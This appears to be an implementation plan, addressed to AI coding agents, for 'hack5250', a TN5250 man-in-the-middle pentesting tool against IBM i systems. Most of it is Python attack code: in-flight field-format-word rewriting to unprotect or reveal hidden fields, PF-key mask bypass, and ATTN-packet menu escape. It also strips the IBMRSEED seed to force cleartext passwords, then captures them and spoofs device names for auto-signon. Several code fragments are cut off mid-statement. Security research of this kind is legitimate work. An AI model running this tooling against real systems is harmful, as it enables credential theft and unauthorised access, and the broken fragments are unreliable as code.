# Phase 2 — hack5250 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the first publicly-available tn5250 MITM pentesting tool — FFW bit manipulation, IBMRSEED auto-signon downgrade, SOH PF-key mask bypass, ATTN→F9 menu escape, against IBM i (AS/400) targets.

**Architecture:** Greenfield package at `hack5250/` depending on `hackterm-core` (Phase 0, tagged `phase0-complete`). One hand-rolled `TN5250` parser implementing the `Protocol` ABC. Reference implementations: Wireshark `packet-tn5250.c` for byte layouts, `lib5250/codes5250.h` for constants, RFC 1205 for the 10-byte SNA-style header, RFC 2877 for NEW-ENVIRON USERVAR negotiation. No 5250 MITM tool exists — every attack here is novel.

**Tech Stack:** Python 3.11+, `hackterm-core>=0.1.0`, `pytest`. PySide6 for GUI (Task 11+, deferred). No external 5250 library — `p5250` wraps `s3270` and is useless for raw datastream access.

**Spec reference:** `docs/superpowers/specs/2026-04-07-hackterm-design.md` §4

```python
"""
5250 protocol constants.

Sources:
  - RFC 1205 (5250 Telnet Interface) — 10-byte header, opcodes
  - RFC 2877 (5250 Telnet Enhancements) — NEW-ENVIRON USERVARs (IBMRSEED, DEVNAME)
  - Wireshark packet-tn5250.c — FFW/FCW bit layouts, AID values
  - lib5250/codes5250.h — command/order opcodes, screen attributes
  - IBM SC30-3533-04 (5494 Functions Reference) — canonical, not freely online

Where sources disagree, Wireshark wins (it's tested against real traffic).
"""

# === 10-byte SNA-style record header (RFC 1205 §3) ===
# Offset 0-1: record length (big-endian, includes header)
# Offset 2-3: record type (0x12A0 = General Data Stream)
# Offset 4:   reserved
# Offset 5:   variable header length (always 0x04 for our purposes)
# Offset 6-7: flags (bit 7 of byte 6 = ERR, bit 6 = ATN attention)
# Offset 8:   opcode
# Offset 9:   reserved
HDR_LEN = 10
GDS_TYPE = 0x12A0

OPCODE_NONE          = 0x00
OPCODE_INVITE        = 0x01
OPCODE_OUTPUT        = 0x02
OPCODE_PUT_GET       = 0x03
OPCODE_SAVE_SCREEN   = 0x04
OPCODE_RESTORE_SCREEN= 0x05
OPCODE_READ_IMMED    = 0x06
OPCODE_READ_SCREEN   = 0x07

# Header flag bits (byte 6)
HDR_FLAG_ERR = 0x80
HDR_FLAG_ATN = 0x40   # ATTN key — used for menu escape

# === Datastream layer (after header) ===
# Commands are preceded by ESC (0x04). Multiple ESC+CMD pairs per record.
ESC = 0x04

# Commands (lib5250/codes5250.h)
CMD_WRITE_TO_DISPLAY  = 0x11
CMD_CLEAR_UNIT        = 0x40
CMD_CLEAR_UNIT_ALT    = 0x20
CMD_CLEAR_FORMAT_TBL  = 0x50
CMD_READ_INPUT_FIELDS = 0x42
CMD_READ_MDT_FIELDS   = 0x52
CMD_READ_MDT_ALT      = 0x82
CMD_READ_SCREEN_IMMED = 0x62
CMD_SAVE_SCREEN       = 0x02
CMD_RESTORE_SCREEN    = 0x12
CMD_WRITE_ERROR_CODE  = 0x21
CMD_WRITE_STRUCTURED  = 0xF3
CMD_ROLL              = 0x23

# === Orders (inside Write to Display, after CC1+CC2 control bytes) ===
ORD_SOH = 0x01    # Start of Header: len(1) + flags + resv + err_row + pf_mask(3)
ORD_RA  = 0x02    # Repeat to Address: row(1) + col(1) + char(1)
ORD_EA  = 0x03    # Erase to Address: row(1) + col(1) + attr(1)
ORD_TD  = 0x10    # Transparent Data: len(2) + raw bytes (DO NOT PARSE)
ORD_SBA = 0x11    # Set Buffer Address: row(1) + col(1)
                  # NOTE: same byte as CMD_WRITE_TO_DISPLAY — context disambiguates
ORD_WEA = 0x12    # Write Extended Attribute
ORD_IC  = 0x13    # Insert Cursor: row(1) + col(1)
ORD_MC  = 0x14    # Move Cursor: row(1) + col(1)
ORD_WDSF= 0x15    # Write to Display Structured Field
ORD_SF  = 0x1D    # Start of Field — see FFW structure below
                  # NOTE: same byte as 3270 SF, but 5250 follows with FFW+attr+len

# === Start of Field structure ===
# ORD_SF (0x1D) is followed by:
#   [FFW: 2 bytes]   — present iff (word & 0xC000) == 0x4000
#   [FCW: 2 bytes]*  — zero or more, present iff (word & 0xC000) == 0x8000
#   screen_attr: 1 byte (0x20-0x3F)
#   field_length: 2 bytes (big-endian)
#
# An "output-only" field (display text, no input) has NO FFW — goes straight
# to attr+len. The FFW marker bits are how you tell.

# === Field Format Word (16 bits, big-endian) ===
FFW_ID         = 0x4000
FFW_ID_MASK    = 0xC000   # top 2 bits: 01=FFW, 10=FCW, else not-a-format-word
FFW_BYPASS     = 0x2000   # ← unprotect target: clear this bit
FFW_DUP        = 0x1000   # dup-key enabled
FFW_MDT        = 0x0800   # modified data tag
FFW_SHIFT_MASK = 0x0700   # ← remove_numeric target: zero these bits
                          #   000=alpha-shift  001=alpha-only  010=numeric-shift
                          #   011=numeric-only 100=katakana    101=digits-only
                          #   110=I/O          111=signed-numeric
FFW_AUTO_ENTER = 0x0080   # auto-enter when field exited
FFW_FER        = 0x0040   # field-exit-required (annoying when fuzzing — clear it)
FFW_MONOCASE   = 0x0020   # uppercase translation
FFW_RESERVED   = 0x0010
FFW_MAND_ENTRY = 0x0008   # mandatory entry
FFW_ADJUST_MASK= 0x0007   # 000=none 101=right-zero 110=right-blank 111=mand-fill

# Numeric-only shift values (FFW_SHIFT_MASK matches)
SHIFT_NUMERIC_ONLY  = 0x0300
SHIFT_DIGITS_ONLY   = 0x0500
SHIFT_SIGNED_NUMERIC= 0x0700

# === Field Control Word (16 bits, optional, may repeat) ===
FCW_ID      = 0x8000
FCW_ID_MASK = 0xC000
# FCW types (resequencing, magstripe, ideographic, etc.) — not needed for attacks

# === Screen attribute byte (range 0x20-0x3F) ===
# Bit layout: 001x_xxxx (top bits 001 mark it as an attribute)
ATTR_GREEN     = 0x20
ATTR_GREEN_RI  = 0x21    # reverse image
ATTR_WHITE     = 0x22
ATTR_WHITE_RI  = 0x23
ATTR_GREEN_UL  = 0x24
ATTR_GREEN_ULI = 0x25
ATTR_WHITE_UL  = 0x26
ATTR_NONDISP   = 0x27    # ← reveal_hidden target: rewrite to ATTR_GREEN/WHITE
ATTR_RED       = 0x28
ATTR_RED_RI    = 0x29
ATTR_RED_BLINK = 0x2A
ATTR_RED_RB    = 0x2B
ATTR_RED_UL    = 0x2C
ATTR_RED_ULI   = 0x2D
ATTR_RED_ULB   = 0x2E
ATTR_NONDISP2  = 0x2F    # alternate non-display
ATTR_TURQ_CS   = 0x30
ATTR_TURQ_CSRI = 0x31
ATTR_YELLOW    = 0x32
ATTR_YELLOW_RI = 0x33
ATTR_TURQ_UL   = 0x34
ATTR_TURQ_ULRI = 0x35
ATTR_YELLOW_UL = 0x36
ATTR_NONDISP3  = 0x37
ATTR_PINK      = 0x38
ATTR_PINK_RI   = 0x39
ATTR_BLUE      = 0x3A
ATTR_BLUE_RI   = 0x3B
ATTR_PINK_UL   = 0x3C
ATTR_PINK_ULRI = 0x3D
ATTR_BLUE_UL   = 0x3E
ATTR_NONDISP4  = 0x3F

# All non-display attribute values (for reveal_hidden detection)
NONDISP_ATTRS = frozenset({ATTR_NONDISP, ATTR_NONDISP2, ATTR_NONDISP3, ATTR_NONDISP4})

# === AID values (terminal → host) ===
# Source: Wireshark packet-tn5250.c value_string aid_vals
# Inbound packet structure: [HDR(10)] [cursor_row:1] [cursor_col:1] [AID:1] [field-data...]
AID_TABLE: dict[str, int] = {
    "ENTER":  0xF1,   # NOTE: this is PF1 in 3270!
    "HELP":   0xF3,
    "ROLLDN": 0xF4,
    "ROLLUP": 0xF5,
    "PRINT":  0xF6,
    "RECBS":  0xF8,   # record backspace
    "CLEAR":  0xBD,
    "AUTO":   0x3F,   # SLP auto-enter
    "PA1":    0x6C,   # same as 3270
    "PA2":    0x6E,   # same as 3270
    "PA3":    0x6B,   # same as 3270
    # F1-F12: contiguous 0x31-0x3C
    "F1": 0x31, "F2": 0x32, "F3": 0x33, "F4": 0x34, "F5": 0x35, "F6": 0x36,
    "F7": 0x37, "F8": 0x38, "F9": 0x39, "F10": 0x3A, "F11": 0x3B, "F12": 0x3C,
    # F13-F24: contiguous 0xB1-0xBC
    "F13": 0xB1, "F14": 0xB2, "F15": 0xB3, "F16": 0xB4, "F17": 0xB5, "F18": 0xB6,
    "F19": 0xB7, "F20": 0xB8, "F21": 0xB9, "F22": 0xBA, "F23": 0xBB, "F24": 0xBC,
}

# Reverse lookup for AID-byte → name
AID_NAMES: dict[int, str] = {v: k for k, v in AID_TABLE.items()}

# === Telnet NEW-ENVIRON (RFC 2877) ===
# Used for IBMRSEED downgrade and DEVNAME spoofing
TELOPT_NEW_ENVIRON = 0x27
NE_IS    = 0x00
NE_SEND  = 0x01
NE_INFO  = 0x02
NE_VAR   = 0x00
NE_VALUE = 0x01
NE_ESC   = 0x02
NE_USERVAR = 0x03

# USERVAR names (ASCII, not EBCDIC — telnet layer)
USERVAR_IBMRSEED  = b"IBMRSEED"
USERVAR_DEVNAME   = b"DEVNAME"
USERVAR_IBMSUBSPW = b"IBMSUBSPW"   # the password (clear or encrypted)
USERVAR_USER      = b"USER"

# Telnet IAC sequences
IAC = 0xFF
SB  = 0xFA
SE  = 0xF0
IAC_EOR = bytes([IAC, 0xEF])
```

```python
Each fixture is a hand-crafted byte sequence with documented structure.

    HDR_LEN, ESC, CMD_WRITE_TO_DISPLAY, CMD_CLEAR_UNIT,
    ORD_SOH, ORD_SBA, ORD_SF, ORD_IC,
    FFW_ID, FFW_BYPASS, FFW_MDT, SHIFT_NUMERIC_ONLY,
    ATTR_GREEN, ATTR_NONDISP, ATTR_WHITE,
    OPCODE_PUT_GET, IAC_EOR,
)


def make_header(body_len: int, opcode: int = OPCODE_PUT_GET, flags: int = 0) -> bytes:
    """Build a 10-byte RFC 1205 header for a body of body_len bytes."""
    rec_len = HDR_LEN + body_len
    return bytes([
        (rec_len >> 8) & 0xFF, rec_len & 0xFF,  # length
        0x12, 0xA0,                              # GDS type
        0x00,                                     # reserved
        0x04,                                     # var hdr len
        flags, 0x00,                              # flags
        opcode,                                   # opcode
        0x00,                                     # reserved
    ])


def make_ffw(bypass=False, mdt=False, numeric=False, mand_entry=False) -> bytes:
    """Build a 2-byte FFW with specified bits set."""
    w = FFW_ID
    if bypass:     w |= FFW_BYPASS
    if mdt:        w |= FFW_MDT
    if numeric:    w |= SHIFT_NUMERIC_ONLY
    if mand_entry: w |= 0x0008
    return bytes([(w >> 8) & 0xFF, w & 0xFF])

    """Smallest valid outbound: header + ESC + Clear Unit + IAC EOR.

    No fields, no text. Tests that the parser doesn't crash on empty screens.
```

```python
"""
TN5250 protocol implementation.

The first publicly-available 5250 datastream parser written for security
testing. Hand-rolled from:
  - Wireshark packet-tn5250.c (byte layouts)
  - lib5250/codes5250.h (constants)
  - RFC 1205 (10-byte header)
  - RFC 2877 (NEW-ENVIRON USERVARs)

Implements hackterm_core.Protocol so attack code is protocol-agnostic.
"""
import logging
from typing import Optional

from hackterm_core import (
    Protocol, Screen, Field, FieldWrite, MutateOpts, NegotiateOpts,
    EbcdicCodec,
)
from hack5250.constants import (
    HDR_LEN, ESC,
    CMD_WRITE_TO_DISPLAY, CMD_CLEAR_UNIT, CMD_CLEAR_UNIT_ALT,
    CMD_WRITE_STRUCTURED, CMD_WRITE_ERROR_CODE,
    ORD_SOH, ORD_RA, ORD_EA, ORD_TD, ORD_SBA, ORD_IC, ORD_MC, ORD_SF, ORD_WEA,
    FFW_ID, FFW_ID_MASK, FFW_BYPASS, FFW_MDT, FFW_SHIFT_MASK,
    FFW_MAND_ENTRY, FFW_FER,
    SHIFT_NUMERIC_ONLY, SHIFT_DIGITS_ONLY, SHIFT_SIGNED_NUMERIC,
    FCW_ID, FCW_ID_MASK,
    ATTR_GREEN, ATTR_WHITE, NONDISP_ATTRS,
    AID_TABLE,
    OPCODE_PUT_GET, HDR_FLAG_ATN,
    IAC, IAC_EOR,
    TELOPT_NEW_ENVIRON, NE_USERVAR, NE_VALUE, NE_SEND, NE_IS,
    USERVAR_IBMRSEED, USERVAR_DEVNAME, USERVAR_IBMSUBSPW, USERVAR_USER,
)


_log = logging.getLogger(__name__)


class TN5250(Protocol):
    name = "tn5250"
    aid_table = AID_TABLE
    default_codepage = "cp037"

    def __init__(self, codepage: str = "cp037"):
        self.codec = EbcdicCodec(codepage)
        # Negotiation-attack state
        self._stripped_seed: Optional[bytes] = None
        self.captured_creds: list[tuple[str, str]] = []  # (user, password)

    # ==================================================================
    # Protocol.detect — telnet handshake recognition
    # ==================================================================

    def detect(self, first_bytes: bytes) -> bool:
        """5250 negotiates via NEW-ENVIRON (option 0x27) with IBM-specific
        USERVARs. Also accepts terminal types like IBM-3179-2, IBM-5251-11.

        Heuristic: see NEW-ENVIRON option byte OR see 'IBM-' followed by
        a 5xxx/3179 model number in the terminal-type negotiation.
        """
        if bytes([IAC, 0xFD, TELOPT_NEW_ENVIRON]) in first_bytes:  # IAC DO NEW-ENVIRON
            return True
        if bytes([IAC, 0xFB, TELOPT_NEW_ENVIRON]) in first_bytes:  # IAC WILL NEW-ENVIRON
            return True
        # Terminal-type announcement (ASCII at telnet layer)
        for marker in (b"IBM-3179", b"IBM-5251", b"IBM-5291", b"IBM-5292", b"IBM-3477"):
            if marker in first_bytes:
                return True
        return False

    # ==================================================================
    # Protocol.parse — outbound (host → terminal) datastream
    # ==================================================================

    def parse(self, data: bytes) -> Screen:
        screen = Screen.empty(rows=24, cols=80)
        screen.raw = data
        screen.pf_mask = 0xFFFFFF  # default: all keys valid (no SOH seen)

        if len(data) < HDR_LEN:
            return screen

        pos = HDR_LEN
        end = len(data)

        # Trim IAC EOR if present
        if end >= 2 and data[end-2:end] == IAC_EOR:
            end -= 2

        cur_row, cur_col = 1, 1

        while pos < end:
            # Look for ESC + command
            if data[pos] != ESC:
                pos += 1
                continue
            if pos + 1 >= end:
                break
            cmd = data[pos + 1]
            pos += 2

            if cmd in (CMD_CLEAR_UNIT, CMD_CLEAR_UNIT_ALT):
                screen.fields = []
                screen.rendered = [[" "] * screen.cols for _ in range(screen.rows)]
                cur_row, cur_col = 1, 1

            elif cmd == CMD_WRITE_TO_DISPLAY:
                # 2 control characters follow (CC1, CC2)
                pos += 2
                pos, cur_row, cur_col = self._parse_wtd_orders(
                    data, pos, end, screen, cur_row, cur_col
                )

            elif cmd == CMD_WRITE_ERROR_CODE:
                # Error code goes to the error line (row 24 typically). Skip for now.
                # Format: text bytes until next ESC or end
                while pos < end and data[pos] != ESC:
                    pos += 1

            elif cmd == CMD_WRITE_STRUCTURED:
                # Structured field: 2-byte length follows
                if pos + 2 <= end:
                    sf_len = (data[pos] << 8) | data[pos + 1]
                    pos += sf_len  # skip entire SF for now
                else:
                    break

            # Other commands (READ_*, SAVE/RESTORE_SCREEN) have no body to parse here

        return screen

    def _parse_wtd_orders(self, data: bytes, pos: int, end: int,
                          screen: Screen, cur_row: int, cur_col: int):
        """Walk Write-to-Display orders until next ESC or end."""
        while pos < end:
            b = data[pos]

            if b == ESC or b == IAC:
                break

            elif b == ORD_SOH:
                # SOH + len(1) + flags(1) + resv(1) + resv(1) + err_row(1) + pf_mask(3)
                if pos + 1 >= end:
                    break
                soh_len = data[pos + 1]
                # pf_mask is the LAST 3 bytes of the SOH body
                if pos + 2 + soh_len <= end and soh_len >= 3:
                    mask_off = pos + 2 + soh_len - 3
                    screen.pf_mask = (
                        (data[mask_off] << 16) |
                        (data[mask_off + 1] << 8) |
                        data[mask_off + 2]
                    )
                pos += 2 + soh_len

            elif b == ORD_SBA:
                if pos + 2 >= end:
                    break
                cur_row = data[pos + 1]
                cur_col = data[pos + 2]
                pos += 3

            elif b == ORD_IC or b == ORD_MC:
                # Insert/Move Cursor: row + col follow. Doesn't change cur_row/col
                # for field positioning, just records cursor.
                pos += 3

            elif b == ORD_RA:
                # Repeat to Address: row + col + char
                if pos + 3 >= end:
                    break
                to_row, to_col, fill = data[pos+1], data[pos+2], data[pos+3]
                self._fill(screen, cur_row, cur_col, to_row, to_col, fill)
                cur_row, cur_col = to_row, to_col
                pos += 4

            elif b == ORD_EA:
                # Erase to Address: row + col + attr
                pos += 4

            elif b == ORD_TD:
                # Transparent Data: 2-byte length + raw bytes. DO NOT PARSE.
                if pos + 2 >= end:
                    break
                td_len = (data[pos+1] << 8) | data[pos+2]
                pos += 3 + td_len

            elif b == ORD_WEA:
                # Write Extended Attribute: 2 bytes follow (attr type + value)
                pos += 3

            elif b == ORD_SF:
                pos += 1
                field, pos = self._parse_sf(data, pos, end, cur_row, cur_col)
                if field is not None:
                    screen.fields.append(field)
                # The attr byte itself takes one screen position
                cur_col += 1
                if cur_col > screen.cols:
                    cur_col = 1
                    cur_row += 1

            elif 0x20 <= b <= 0x3F:
                # Standalone screen attribute byte — applies to following text.
                # Takes one screen position.
                cur_col += 1
                pos += 1

            else:
                # Text byte — render to grid
                if 1 <= cur_row <= screen.rows and 1 <= cur_col <= screen.cols:
                    screen.rendered[cur_row - 1][cur_col - 1] = self.codec.to_ascii(bytes([b]))
                cur_col += 1
                if cur_col > screen.cols:
                    cur_col = 1
                    cur_row += 1
                pos += 1

        return pos, cur_row, cur_col

    def _parse_sf(self, data: bytes, pos: int, end: int, row: int, col: int):
        """Parse a Start-of-Field order body.

        Structure after 0x1D:
          [FFW: 2 bytes]   if (word & 0xC000) == 0x4000
          [FCW: 2 bytes]*  while (word & 0xC000) == 0x8000
          attr: 1 byte
          length: 2 bytes (big-endian)

        Returns (Field, new_pos) or (None, pos) on truncation.
        """
        ffw = None

        # Check for FFW
        if pos + 2 <= end:
            word = (data[pos] << 8) | data[pos + 1]
            if (word & FFW_ID_MASK) == FFW_ID:
                ffw = word
                pos += 2
                # Skip any FCWs
                while pos + 2 <= end:
                    word = (data[pos] << 8) | data[pos + 1]
                    if (word & FCW_ID_MASK) == FCW_ID:
                        pos += 2
                    else:
                        break

        # attr (1) + length (2)
        if pos + 3 > end:
            return None, pos
        attr = data[pos]
        flen = (data[pos + 1] << 8) | data[pos + 2]
        pos += 3

        # Decode FFW bits
        if ffw is not None:
            protected = bool(ffw & FFW_BYPASS)
            mdt = bool(ffw & FFW_MDT)
            shift = ffw & FFW_SHIFT_MASK
            numeric = shift in (SHIFT_NUMERIC_ONLY, SHIFT_DIGITS_ONLY, SHIFT_SIGNED_NUMERIC)
        else:
            # No FFW = output-only field = implicitly protected
            protected = True
            mdt = False
            numeric = False

        hidden = attr in NONDISP_ATTRS

        return Field(
            row=row, col=col, length=flen,
            protected=protected, hidden=hidden, numeric=numeric, mdt=mdt,
            content=b"",  # filled by caller from following text bytes if needed
        ), pos

    def _fill(self, screen: Screen, from_row, from_col, to_row, to_col, fill_byte):
        """Implement RA (Repeat to Address)."""
        ch = self.codec.to_ascii(bytes([fill_byte]))
        r, c = from_row, from_col
        while (r, c) != (to_row, to_col):
            if 1 <= r <= screen.rows and 1 <= c <= screen.cols:
                screen.rendered[r - 1][c - 1] = ch
            c += 1
            if c > screen.cols:
                c = 1
                r += 1
                if r > screen.rows:
                    break

    # ==================================================================
    # Stubs for remaining Protocol methods — Tasks 2-4 implement these
    # ==================================================================

    def negotiate_hook(self, data: bytes, direction: str, opts: NegotiateOpts) -> bytes:
        return data  # Task 4

    def mutate(self, data: bytes, opts: MutateOpts) -> bytes:
        return data  # Task 2

    def build_inbound(self, aid: int, cursor: tuple[int, int],
                      fields: list[FieldWrite]) -> bytes:
        return b""  # Task 3

    def spoof_aid(self, original: bytes, new_aid: int) -> bytes:
        return original  # Task 3
```

```python
    def mutate(self, data: bytes, opts: MutateOpts) -> bytes:
        """In-flight FFW manipulation.

        Walks the same structure as parse() but mutates a bytearray copy.
        Never changes packet length — all mutations are byte-rewrites.
        """
        if not any([opts.unprotect, opts.reveal_hidden, opts.remove_numeric]):
            return data  # nothing to do

        out = bytearray(data)
        if len(out) < HDR_LEN:
            return bytes(out)

        pos = HDR_LEN
        end = len(out)
        if end >= 2 and out[end-2:end] == IAC_EOR:
            end -= 2

        while pos < end:
            if out[pos] != ESC:
                pos += 1
                continue
            if pos + 1 >= end:
                break
            cmd = out[pos + 1]
            pos += 2

            if cmd == CMD_WRITE_TO_DISPLAY:
                pos += 2  # CC1, CC2
                pos = self._mutate_wtd_orders(out, pos, end, opts)
            elif cmd == CMD_WRITE_STRUCTURED:
                if pos + 2 <= end:
                    sf_len = (out[pos] << 8) | out[pos + 1]
                    pos += sf_len
                else:
                    break
            # Other commands have no mutable body

        return bytes(out)

    def _mutate_wtd_orders(self, out: bytearray, pos: int, end: int,
                           opts: MutateOpts) -> int:
        while pos < end:
            b = out[pos]

            if b == ESC or b == IAC:
                break

            elif b == ORD_SOH:
                if pos + 1 >= end:
                    break
                soh_len = out[pos + 1]
                if opts.unprotect and pos + 2 + soh_len <= end and soh_len >= 3:
                    # SOH PF-MASK BYPASS: enable all 24 F-keys
                    mask_off = pos + 2 + soh_len - 3
                    out[mask_off] = 0xFF
                    out[mask_off + 1] = 0xFF
                    out[mask_off + 2] = 0xFF
                pos += 2 + soh_len

            elif b == ORD_SBA:
                pos += 3
            elif b in (ORD_IC, ORD_MC):
                pos += 3
            elif b == ORD_RA:
                pos += 4
            elif b == ORD_EA:
                pos += 4
            elif b == ORD_WEA:
                pos += 3

            elif b == ORD_TD:
                # CRITICAL: skip transparent data without parsing
                if pos + 2 >= end:
                    break
                td_len = (out[pos + 1] << 8) | out[pos + 2]
                pos += 3 + td_len

            elif b == ORD_SF:
                pos += 1
                pos = self._mutate_sf(out, pos, end, opts)

            elif 0x20 <= b <= 0x3F:
                # Standalone screen attribute
                if opts.reveal_hidden and b in NONDISP_ATTRS:
                    out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
                pos += 1

            else:
                pos += 1  # text byte

        return pos

                   opts: MutateOpts) -> int:
        """Mutate the FFW and screen-attr inside a Start-of-Field."""
        # FFW present?
        if pos + 2 <= end:
            word = (out[pos] << 8) | out[pos + 1]
            if (word & FFW_ID_MASK) == FFW_ID:
                # === THE FFW ATTACK ===
                if opts.unprotect:
                    word &= ~FFW_BYPASS
                if opts.remove_numeric:
                    word &= ~FFW_SHIFT_MASK
                    word &= ~FFW_MAND_ENTRY
                    word &= ~FFW_FER
                out[pos] = (word >> 8) & 0xFF
                out[pos + 1] = word & 0xFF
                pos += 2
                # Skip FCWs
                while pos + 2 <= end:
                    w = (out[pos] << 8) | out[pos + 1]
                    if (w & FCW_ID_MASK) == FCW_ID:
                        pos += 2
                    else:
                        break

        # Screen attribute byte
        if pos < end:
            attr = out[pos]
            if opts.reveal_hidden and attr in NONDISP_ATTRS:
                out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
            pos += 1

        # Field length (2 bytes) — skip
        pos += 2
        return pos
```

```python
    def build_inbound(self, aid: int, cursor: tuple[int, int],
                      fields: list[FieldWrite]) -> bytes:
        """Build a packet the terminal would send.

        5250 inbound structure:
          [10-byte header] cursor_row cursor_col AID [SBA row col data]* IAC EOR

        NOTE: cursor comes BEFORE aid (3270 has aid first). This is the
        single most error-prone difference between the protocols.
        """
        body = bytearray()
        body.append(cursor[0])  # row
        body.append(cursor[1])  # col
        body.append(aid)
        for fw in fields:
            body.append(ORD_SBA)
            body.append(fw.row)
            body.append(fw.col)
            body.extend(fw.data)

        rec_len = HDR_LEN + len(body) + len(IAC_EOR)
        hdr = bytearray(HDR_LEN)
        hdr[0] = (rec_len >> 8) & 0xFF
        hdr[1] = rec_len & 0xFF
        hdr[2] = 0x12
        hdr[3] = 0xA0   # GDS type
        hdr[5] = 0x04   # var hdr len
        hdr[8] = OPCODE_PUT_GET

        return bytes(hdr) + bytes(body) + IAC_EOR

    def spoof_aid(self, original: bytes, new_aid: int) -> bytes:
        """Replace the AID byte in a captured inbound packet.

        5250 AID is at offset HDR_LEN + 2 (after cursor row + col).
        """
        aid_pos = HDR_LEN + 2
        if len(original) <= aid_pos:
            return original
        out = bytearray(original)
        out[aid_pos] = new_aid
        return bytes(out)
```

```python
    def negotiate_hook(self, data: bytes, direction: str,
                       opts: NegotiateOpts) -> bytes:
        """RFC 2877 negotiation manipulation.

        IBMRSEED downgrade (force_cleartext, s2c only):
          Server sends: IAC SB NEW-ENVIRON SEND USERVAR "IBMRSEED" <8-byte-seed> ...
          We strip the 8 seed bytes. Client receives empty IBMRSEED, falls
          back to sending IBMSUBSPW in cleartext per RFC 2877 §5.

        DEVNAME spoof (spoof_device_name, c2s only):
          Client sends: ... USERVAR "DEVNAME" VALUE "QPADEV0001" ...
          We rewrite the value. If the IBM i has device descriptions tied
          to user profiles (CRTDEVDSP USRPRF(...)), spoofing yields auto-signon.

        Cleartext capture (force_cleartext, c2s only):
          After we stripped the seed, watch for USERVAR "IBMSUBSPW" VALUE
          coming back from the client. Log the credential.
        """
        # --- s2c: strip IBMRSEED seed -------------------------------------
        if direction == "s2c" and opts.force_cleartext:
            marker = bytes([NE_USERVAR]) + USERVAR_IBMRSEED
            idx = data.find(marker)
            if idx != -1:
                seed_start = idx + len(marker)
                # The seed is the next 8 bytes (before next USERVAR/VAR or IAC)
                if seed_start + 8 <= len(data):
                    self._stripped_seed = data[seed_start:seed_start + 8]
                    _log.info("IBMRSEED seed stripped: %s",
                              self._stripped_seed.hex())
                    data = data[:seed_start] + data[seed_start + 8:]

        # --- c2s: capture cleartext password ------------------------------
        if (direction == "c2s" and opts.force_cleartext
                and self._stripped_seed is not None):
            user = self._extract_uservar_value(data, USERVAR_USER)
            password = self._extract_uservar_value(data, USERVAR_IBMSUBSPW)
            if password is not None:

            idx = data.find(marker)
            if idx != -1:
                val_start = idx + len(marker)
                # Find end of value (next USERVAR/VAR/IAC byte)
                val_end = val_start
                while val_end < len(data) and data[val_end] not in (
                        NE_USERVAR, 0x00, IAC):
                    val_end += 1
                new_val = opts.spoof_device_name.encode("ascii")
                data = data[:val_start] + new_val + data[val_end:]

        return data

    @staticmethod
    def _extract_uservar_value(data: bytes, varname: bytes) -> Optional[str]:
        """Find USERVAR <varname> VALUE <...> and extract the value as ASCII."""
        marker = bytes([NE_USERVAR]) + varname + bytes([NE_VALUE])
        idx = data.find(marker)
        if idx == -1:
            return None
        val_start = idx + len(marker)
        val_end = val_start
        while val_end < len(data) and data[val_end] not in (NE_USERVAR, 0x00, IAC):
            val_end += 1
        return data[val_start:val_end].decode("ascii", errors="replace")
```

```python
"""
ATTN-key menu escape and SOH PF-mask analysis.

The Silent Signal technique (blog.silentsignal.eu/2022/09/05): pressing
ATTN interrupts the current program and displays the Operational Assistant
menu. From there, F9 brings up a CL command line — bypassing menu-based
security entirely. This works unless the user profile's ATNPGM has been
explicitly overridden (which most shops don't do).

This module provides the building blocks; the GUI/MCP layer drives the
sequence (ATTN → wait → check screen → F9 → wait → check for ===> prompt).

SOH PF-mask analysis: the SOH order in Write-to-Display includes a 24-bit
mask of which F-keys the host considers valid. Keys NOT in the mask are
the interesting ones — they may have handlers the menu doesn't advertise.
TN5250.mutate(unprotect=True) already rewrites the mask to all-enabled;
this module just reports which keys were originally masked.
"""
from typing import Literal
from hackterm_core import Screen
from hack5250.constants import HDR_LEN, HDR_FLAG_ATN, OPCODE_NONE, IAC_EOR


def build_attn_packet() -> bytes:
    """Build an ATTN inbound packet.

    ATTN is signaled via the header flag byte (bit 0x40), not an AID.
    The body is empty — just header + IAC EOR.
    """
    rec_len = HDR_LEN + len(IAC_EOR)
    hdr = bytearray(HDR_LEN)
    hdr[0] = (rec_len >> 8) & 0xFF
    hdr[1] = rec_len & 0xFF
    hdr[2] = 0x12
    hdr[3] = 0xA0
    hdr[5] = 0x04
    hdr[6] = HDR_FLAG_ATN   # ← the attack
    hdr[8] = OPCODE_NONE
    return bytes(hdr) + IAC_EOR


def get_masked_keys(screen: Screen) -> list[str]:
    """Which F-keys did the host say were INVALID?

    These are the keys to fuzz first — if a handler exists for a key
    the host claims is invalid, the developer forgot to remove it.

    pf_mask is 24-bit, bit N (from MSB, 0-indexed) = F(N+1).
    """
    pf_mask = getattr(screen, 'pf_mask', None)
    if pf_mask is None or pf_mask == 0xFFFFFF:
        return []
    masked = []
    for i in range(24):
        bit = 1 << (23 - i)
        if not (pf_mask & bit):
            masked.append(f"F{i + 1}")
    return masked


AttnResult = Literal["OPER_ASSIST", "SYS_REQUEST", "CMDLINE", "BLOCKED"]


def classify_attn_response(screen: Screen) -> AttnResult:
    """Categorize what came back after sending ATTN.

    OPER_ASSIST: Operational Assistant menu — F9 should give command line.
    SYS_REQUEST: System Request menu — different escape path, also useful.
    CMDLINE:     ===> already present — F9 already worked or wasn't needed.
    BLOCKED:     ATNPGM is overridden, ATTN handler intercepted us.
    """
    text = screen.text
    if "===>" in text:
        return "CMDLINE"
    if "Operational Assistant" in text:
        return "OPER_ASSIST"
    if "System Request" in text:
        return "SYS_REQUEST"
    return "BLOCKED"
```

```python
"""End-to-end: TN5250 plugged into hackterm-core ProxyDaemon."""
import pytest
import socket
import threading
import time
from hack5250 import TN5250
from hackterm_core import ProxyDaemon, Storage, MutateOpts


@pytest.fixture
def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _pump(daemon, n=50, delay=0.01):
    for _ in range(n):
        daemon.tick()
        time.sleep(delay)


def test_e2e_unprotect_via_proxy(tmp_path, free_port, pkt_protected_field):
    """Server sends protected field, client receives unprotected.

    This proves: TN5250 implements Protocol correctly, ProxyDaemon
    routes through mutate(), the FFW manipulation actually works
    end-to-end through real sockets.
    """
    proto = TN5250()
    storage = Storage(str(tmp_path / "test.db"), "127.0.0.1", 23, 3271, False)

    server_listener = socket.socket()
